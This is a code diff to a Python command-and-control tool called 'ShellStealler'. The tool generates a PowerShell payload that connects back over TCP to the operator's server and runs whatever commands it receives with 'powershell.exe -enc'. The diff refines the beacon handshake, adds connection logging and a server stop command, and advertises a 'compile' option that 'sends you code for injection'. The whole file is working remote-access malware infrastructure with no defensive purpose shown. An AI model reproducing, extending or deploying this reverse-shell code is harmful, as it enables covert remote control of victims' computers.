@@ -3,9 +3,11 @@ import base64
 from threading import Thread
 import socket
 import sys
+import sqlite
 
 commandToSend = 'None'
 WebCamCompile = False
+serverStatus = True
 
 def Base64Command(command):
     commandInBytes = command.encode('UTF-8')
@@ -43,7 +45,7 @@ class CreateListener():
 
         server = f"'{self.server}'"
 
-        self.command = f"$server = {server};$port = {self.port};$message = 'Get-Command';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);while ($true) {figOpen}try {figOpen}$stream = $socket.GetStream();$writer = New-Object System.IO.StreamWriter($stream);foreach ($line in $message){figOpen}$writer.WriteLine($line);$writer.Flush();{figClose}$reader = New-Object System.IO.StreamReader($stream);$string = '';while ($reader.Peek() -ge 0){figOpen}$result = $reader.Read();$string += [char]$result;{figClose}if ('None' -ne $string) {figOpen}powershell.exe -enc $string;{figClose}Start-Sleep -Seconds {self.sleep};{figClose}catch{figOpen}$server = {server};$port = {self.port};$message = 'Get-Command';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);Start-Sleep -Seconds 5;{figClose}{figClose};"
+        self.command = f"$server = {server};$port = {self.port};$message = 'New';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);while ($true) {figOpen}try {figOpen}$stream = $socket.GetStream();$writer = New-Object System.IO.StreamWriter($stream);foreach ($line in $message){figOpen}$writer.WriteLine($line);$writer.Flush();{figClose}$reader = New-Object System.IO.StreamReader($stream);$string = '';while ($reader.Peek() -ge 0){figOpen}$result = $reader.Read();$string += [char]$result;{figClose}if ('None' -ne $string) {figOpen}powershell.exe -enc $string;{figClose}$message = 'Get-Command';Start-Sleep -Seconds {self.sleep};Write-Host 'Received $string';{figClose}catch{figOpen}$server = {server};$port = {self.port};$message = 'Get-Command';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);Start-Sleep -Seconds 5;{figClose}{figClose};"
 
         print('[+] Listener Created')
 
@@ -59,10 +61,13 @@ def StartServer():
     while True:
         try:
             connection, client_address = sock.accept()
+            ip, port = client_address
             try:
                 while True:
                     data = connection.recv(16)
                     if data:
+                        if "new" in data.decode('UTF-8').lower():
+                            print(f'\r[+] Connection on {ip}:{port}\nShellStealler > ', end="")
                         connection.sendall(bytes(commandToSend, 'UTF-8'))
                         commandToSend='None'
                     else:
@@ -70,7 +75,7 @@ def StartServer():
             finally:
                 connection.close()
         except Exception as e:
-            print(f'ERR: {e}')
+            print(f'\r[!] Disconnect on {ip}:{port}\nShellStealler > ', end="")
 
 class Server():
     def Start(self):
@@ -127,7 +132,7 @@ while True:
     command = input('ShellStealler > ')
     if command.split(' ')[0].lower() == 'server':
         if len(command.split(' ')) == 1:
-            print("Options of 'server' command:\n    create - Create server\n    start - Start server")
+            print("Options of 'server' command:\n    create - Create server\n    start - Start server\n    stop - Stop server")
         else:
             try:
                 ServerS.Check()
@@ -135,17 +140,24 @@ while True:
                 pass
             if command.split(' ')[1].lower() == 'start':
                 try:
-                    ServerS.Start()
+                    if serverStatus:
+                        ServerS.Start()
+                    else:
+                        serverStatus = True
+                        print('[+] Server started at localhost with 1330 port')
                 except Exception as e:
                     print('[!] No server found! Create server by "server create" command')
             elif command.split(' ')[1].lower() == 'create':
                 ServerS = Server()
                 print('[+] Server created')
+            elif command.split(' ')[1].lower() == 'stop':
+                serverStatus = False
+                print('[+] Server stopped')
             else:
                 print(f'[!] No parametr {command.split(" ")[1]}')
     elif command.split(' ')[0].lower() == 'listener':
         if len(command.split(' ')) == 1:
-            print("Options of 'listener' command:\n    create [server name] - Create listener\n    compile - Sends you code for injection")
+            print("Options of 'listener' command:\n    create [server name] - Create listener\n    compile - Sends you code for injection\n    list - Shows you list of connections")
         else:
             try:
                 ListenerS.Check()
